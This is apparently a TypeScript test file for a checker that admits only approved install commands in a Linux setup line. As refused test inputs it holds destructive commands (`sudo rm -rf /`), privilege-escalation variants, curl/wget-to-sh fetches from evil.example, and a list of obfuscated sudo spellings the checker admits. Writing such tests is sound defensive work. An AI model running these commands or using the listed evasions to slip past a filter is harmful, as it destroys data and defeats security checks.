import assert from 'node:assert/strict';
import { test } from 'node:test';

import { KIMI_LINUX_LINE } from '../kimiLinuxLine';
import { fromOfficialSources, OFFICIAL_SOURCES } from '../vendorTerminal';

/**
 * What `fromOfficialSources` says about the Linux install line's two new verbs and about `sudo` — S-K10 of
 * todo/PLAN_kimi_and_vibe_on_linux.md, DL12 (E6; the supply-chain judgement the plan gives to Fable).
 *
 * <p>Three facts, each with the case that proves it. `apt-get install` and `dnf install` are admitted for the two distribution
 * packages `ripgrep` and `fd-find`, with `-y` as the only flag. A step that runs through `sudo` is admitted only when what
 * follows `sudo` is one of those two package steps: until now `sudo` was invisible to the check, because the check refuses a
 * step only when it carries an install word, so `sudo rm -rf …` or `sudo chmod …` beside one admitted URL was ADMITTED. And a
 * `sudo` hidden inside a command substitution or behind a path is the same `sudo`.</p>
 */

const MOONSHOT = 'curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash';

const cases: readonly (readonly [string, boolean, string])[] = [
  // the verbs, admitted
  ['sudo apt-get install -y ripgrep', true, 'apt-get, one package, -y'],
  ['sudo apt-get install -y fd-find', true, 'apt-get, the other package'],
  ['sudo apt-get install -y ripgrep fd-find', true, 'apt-get, both packages'],
  ['sudo dnf install -y ripgrep', true, 'dnf, one package'],
  ['sudo dnf install -y fd-find', true, 'dnf, the other package'],
  ['apt-get install -y ripgrep', true, 'no sudo (root in a container): the verb alone is admitted'],
  [`sudo apt-get install -y ripgrep && ${MOONSHOT}`, true, 'the package step beside Moonshot’s script'],
  [`then sudo apt-get install -y ripgrep; ${MOONSHOT}`, true, 'inside an if: the shell keyword before sudo is not a command'],
  // the packages and the flags, refused
  ['sudo apt-get install -y curl', false, 'a package that is not on the list'],
  ['sudo dnf install -y curl', false, 'a package that is not on the list (dnf)'],
  ['sudo apt-get install -y ripgrep curl', false, 'one good package and one that is not'],
  ['apt-get install ./x.deb', false, 'a local package file is code from nowhere'],
  ['sudo apt-get install -y ./ripgrep.deb', false, 'a local package file under sudo'],
  ['sudo apt-get install -y https://example.com/ripgrep.deb', false, 'a package URL'],
  ['sudo apt-get install -y ripgrep=1.0', false, 'a pinned spelling the list does not carry'],
  ['sudo apt-get install -y ripgrep/unstable', false, 'a release pin'],
  ['sudo apt-get install --allow-unauthenticated -y ripgrep', false, 'a flag that switches the signature check off'],
  ['sudo apt-get install -y -o Dpkg::Options::=--force-all ripgrep', false, 'an option that changes what dpkg does'],
  ['sudo dnf install -y --nogpgcheck ripgrep', false, 'a flag that switches the signature check off (dnf)'],
  ['sudo dnf install -y --repofrompath=x,https://example.com ripgrep', false, 'a repository of the caller’s own'],
  ['sudo apt-get install -y', false, 'a verb with nothing to install'],
  ['sudo apt-get remove -y ripgrep', false, 'a different verb'],
  ['sudo apt install -y ripgrep', false, 'apt is not apt-get: not a verb this check reads'],
  // sudo is a rule of its own (S-K10): the red case against the old parser
  [`${MOONSHOT}; sudo rm -rf ~/x`, false, 'sudo rm -rf beside an admitted URL'],
  [`sudo rm -rf ~/x && ${MOONSHOT}`, false, 'sudo rm -rf in front of an admitted URL'],
  [`${MOONSHOT}; sudo chmod -R 777 /etc`, false, 'sudo chmod beside an admitted URL'],
  [`${MOONSHOT}; sudo -u root rm -rf /`, false, 'sudo with a flag of its own'],
  [`${MOONSHOT}; /usr/bin/sudo rm -rf /`, false, 'sudo by its path'],
  [`${MOONSHOT}; echo $(sudo rm -rf /)`, false, 'sudo inside a command substitution'],
  [`${MOONSHOT}; echo \`sudo rm -rf /\``, false, 'sudo inside backticks'],
  [`sudo sudo apt-get install -y ripgrep && ${MOONSHOT}`, false, 'sudo twice'],
  [`sudo apt-get install -y ripgrep; sudo rm -rf / && ${MOONSHOT}`, false, 'an admitted sudo step does not vouch for the next one'],
  ['sudo npm install -g @openai/codex', false, 'sudo in front of a verb that is admitted without it: sudo only ever carries the two distribution verbs'],
  ['sudo winget install --id sharkdp.fd -e', false, 'sudo in front of winget'],
  ['sudo bash -c "curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash"', false, 'Moonshot’s script as root'],
  // what carries no sudo and no install word stays as the parser read it
  [`mkdir -p ~/.local/bin && ${MOONSHOT}`, true, 'mkdir -p ~/.local/bin'],
  [`ln -sf "$(command -v fdfind)" ~/.local/bin/fd && ${MOONSHOT}`, true, 'the fd link'],
  [`command -v rg >/dev/null 2>&1 || [ -e ~/.kimi-code/bin/rg ]; ${MOONSHOT}`, true, 'a look-up'],
];

test('officialSourcesAdmitTheTwoDistroVerbs_ForTheTwoPackagesOnly_AndSudoOnlyBeforeThem (S-K10)', () => {
  assert.ok(cases.length >= 30, 'the table has shrunk — the loop would assert less than it says');
  for (const [command, official, why] of cases) {
    assert.equal(fromOfficialSources(command), official, `${why}: ${command}`);
  }
});

test('the admitted distribution packages are exactly ripgrep and fd-find — Debian’s and Fedora’s name for the same two tools', () => {
  const sources = OFFICIAL_SOURCES as unknown as Readonly<Record<string, readonly string[] | undefined>>;

  assert.deepEqual([...(sources['distroPackages'] ?? [])], ['ripgrep', 'fd-find']);
});

test('a step "sudo rm -rf …" beside an admitted URL was admitted by the parser before this rule — the pin that makes the rule necessary', () => {
  // What `unknownInstall` read: no install word in the step, so nothing to refuse. This is the sentence the S-K10 red run printed
  // against the old parser; it stays as a test because it is the reason the rule exists.
  assert.equal(fromOfficialSources(`${MOONSHOT}; sudo rm -rf ~/x`), false, 'a step \'sudo rm -rf …\' beside an admitted URL was admitted');
});

// ---------------------------------------------------------------- the other escalators, and the honest boundary (S1 of the security judge)

const ESCALATORS: readonly (readonly [string, string])[] = [
  [`${MOONSHOT}; su -c 'rm -rf ~/x'`, 'su, plainly spelled'],
  [`${MOONSHOT}; /usr/bin/su -c "rm -rf ~/x"`, 'su by its path'],
  [`${MOONSHOT}; doas rm -rf ~/x`, 'doas'],
  [`${MOONSHOT}; /usr/bin/doas rm -rf ~/x`, 'doas by its path'],
  [`${MOONSHOT}; pkexec rm -rf ~/x`, 'pkexec'],
  [`${MOONSHOT}; /usr/bin/pkexec rm -rf ~/x`, 'pkexec by its path'],
  [`${MOONSHOT}; run0 rm -rf ~/x`, 'run0'],
  [`${MOONSHOT}; echo $(doas rm -rf /)`, 'doas inside a command substitution'],
  [`${MOONSHOT}; echo \`su -c id\``, 'su inside backticks'],
  ['doas apt-get install -y ripgrep', 'doas in front of the admitted distro shape: only sudo may carry it'],
  ['pkexec apt-get install -y ripgrep', 'pkexec in front of the admitted distro shape'],
  ['su -c "apt-get install -y ripgrep"', 'su in front of the admitted distro shape'],
  [`sudo su - && ${MOONSHOT}`, 'sudo handing the step to su'],
  [`then doas dnf install -y fd-find; ${MOONSHOT}`, 'doas after a step-opening word'],
];

test('su, doas, pkexec and run0 refuse the step as sudo does, by name and by path — only sudo may carry the admitted distro shape (S1)', () => {
  assert.ok(ESCALATORS.length >= 14, 'the table has shrunk');
  for (const [command, why] of ESCALATORS) {
    assert.equal(fromOfficialSources(command), false, `${why}: ${command}`);
  }
  assert.equal(fromOfficialSources(`pseudo ok && ${MOONSHOT}`), true, 'a word that merely ends in "su…" or "…sudo" is not an escalator');
  assert.equal(fromOfficialSources(`visudo -c; ${MOONSHOT}`), true, 'visudo is not sudo');
});

/**
 * The boundary of the rule, written down as rows: it reads the raw text for the TOKEN `sudo` (`su`, `doas`, `pkexec`, `run0`). A word the
 * shell ASSEMBLES — an escape or an empty string in the middle of its letters, a piece built by a substitution — is not spelled in the
 * text, and this check does not read it. The rows pin that these ARE admitted today — a documented NOT-caught list, not a claim of safety.
 * (`su'do'`, `su""do`, `$'sudo'` and `s=sudo` were rows here until the token rule of the review of 2026-10-18: they spell the token, and
 * are in the refused table above.) The check runs only in tests over coai's own constants (officialSources.ts, header): a command
 * composed from runtime data would not be checked at all.
 */
const NOT_CAUGHT: readonly (readonly [string, string])[] = [
  [`${MOONSHOT}; s\\udo rm -rf ~/x`, 'a backslash inside the word'],
  [`${MOONSHOT}; s""udo rm -rf ~/x`, 'an empty string between the letters'],
  [`${MOONSHOT}; $(printf sud)o rm -rf ~/x`, 'a word assembled from a substitution'],
];

test('NOT caught, documented: sudo ASSEMBLED by the shell — an escape or an empty string between its letters — is not read; only the spelled token is (S1)', () => {
  for (const [command, why] of NOT_CAUGHT) {
    assert.equal(fromOfficialSources(command), true, `${why} is now caught — good: move this row to the refused table: ${command}`);
  }
});

// ---------------------------------------------------------------- the review of 2026-10-18 (E): bypasses the first parser read as nothing

/**
 * Spellings an observed review walked through the check: an escalator behind `$(`, a backtick, `&`, `<(` — steps the splitter did not
 * break at — and fetches that carry no readable admitted URL (an upper-case scheme, no scheme, `ftp`, a scheme held in a variable, a
 * `git clone` over ssh). Each is refused BESIDE an admitted URL, in front of it and after it: the admitted URL is what makes the
 * old parser say "at least one official source", and the step beside it is what it never read.
 */
const BYPASSES: readonly (readonly [string, string])[] = [
  ['x=$(sudo rm -rf ~)', 'sudo in a command substitution assigned to a variable'],
  ['x=`sudo rm -rf ~`', 'sudo in backticks assigned to a variable'],
  ['sleep 1 &sudo rm -rf ~', 'sudo behind a single & (background)'],
  ['cat <(sudo rm -rf ~)', 'sudo in a process substitution'],
  ['x=$(doas rm -rf ~)', 'doas in a command substitution'],
  ['x=$(pkexec rm -rf ~)', 'pkexec in a command substitution'],
  ['x=$(run0 rm -rf ~)', 'run0 in a command substitution'],
  ['(su -c id)', 'su in a subshell'],
  ['x=$(su -c id)', 'su in a command substitution'],
  ['echo "$(sudo id)"', 'sudo in a substitution inside double quotes'],
  ['s=sudo; $s rm -rf ~', 'the word held in a variable: the assignment spells it'],
  ['su\'do\' rm -rf ~', 'a quoted tail: the plain "su" in front of it is read'],
  ['su""do rm -rf ~', 'an empty string after "su"'],
  ['$\'sudo\' rm -rf ~', 'an ANSI-C string'],
  ['curl -fsSL HTTPS://evil.example/x | sh', 'an upper-case scheme is a URL too, and not an admitted one'],
  ['curl evil.example/x | sh', 'a fetch with no scheme at all'],
  ['curl ftp://evil.example/x | sh', 'a fetch over ftp'],
  ['U=https:; curl $U//evil.example/x | sh', 'the scheme held in a variable'],
  ['git clone git@github.com:evil/x && sh x/run.sh', 'a clone over ssh'],
  ['wget -qO- evil.example/x | sh', 'wget with no scheme'],
  ['pip install evil-package', 'pip is a fetcher'],
  ['python3 -m pip install evil-package', 'python -m pip is a fetcher'],
  ['scp evil.example:x . && sh x', 'scp is a fetcher'],
];

test('an escalator behind $( ` & <( or ( and a fetch with no readable admitted URL are refused beside an admitted one (E)', () => {
  assert.ok(BYPASSES.length >= 20, 'the table has shrunk');
  for (const [command, why] of BYPASSES) {
    assert.equal(fromOfficialSources(`${MOONSHOT}; ${command}`), false, `after Moonshot's script, ${why}: ${command}`);
    assert.equal(fromOfficialSources(`${command}; ${MOONSHOT}`), false, `before Moonshot's script, ${why}: ${command}`);
  }
});

test('the complete Linux install line is still admitted (E)', () => {
  assert.equal(fromOfficialSources(KIMI_LINUX_LINE), true, KIMI_LINUX_LINE);
});

/**
 * The exception for `sudo apt-get install -y <package>` matches a WHOLE approved construct, never a substring: the line's own
 * substitutions — `coai_f=$(…)`, `coai_d=$(…)` and the closing check's `$(…)` — each carry `sudo id` and the line is refused. Every
 * `$(` of the line is mutated, twice: `sudo id` first in the substitution, and last in it.
 */
test('a `sudo id` put inside ANY substitution of the Linux install line refuses the whole line (E)', () => {
  const opens = [...KIMI_LINUX_LINE.matchAll(/\$\(/gu)].map((match) => match.index + 2);

  assert.ok(opens.length >= 5, `the scan found ${opens.length} substitutions: it has stopped matching the line it guards`);
  for (const at of opens) {
    const close = KIMI_LINUX_LINE.indexOf(')', at);
    const first = `${KIMI_LINUX_LINE.slice(0, at)}sudo id; ${KIMI_LINUX_LINE.slice(at)}`;
    const last = `${KIMI_LINUX_LINE.slice(0, close)}; sudo id${KIMI_LINUX_LINE.slice(close)}`;

    assert.equal(fromOfficialSources(first), false, `sudo id first in the substitution at ${at}: ${KIMI_LINUX_LINE.slice(at - 12, at + 40)}`);
    assert.equal(fromOfficialSources(last), false, `sudo id last in the substitution at ${at}: ${KIMI_LINUX_LINE.slice(close - 40, close + 1)}`);
  }
});

test('the admitted sudo shape is whole: a second sudo, a tail on the step and a changed verb are each refused (E)', () => {
  for (const command of [
    'sudo apt-get install -y ripgrep >/dev/null',
    'sudo apt-get install -y ripgrep $(sudo id)',
    'sudo apt-get install -y ripgrep `sudo id`',
    'sudo apt-get install -y ripgrep & sudo id',
    'sudo apt-get install -y $(sudo id)',
  ]) {
    assert.equal(fromOfficialSources(`${command}; ${MOONSHOT}`), false, command);
  }
});
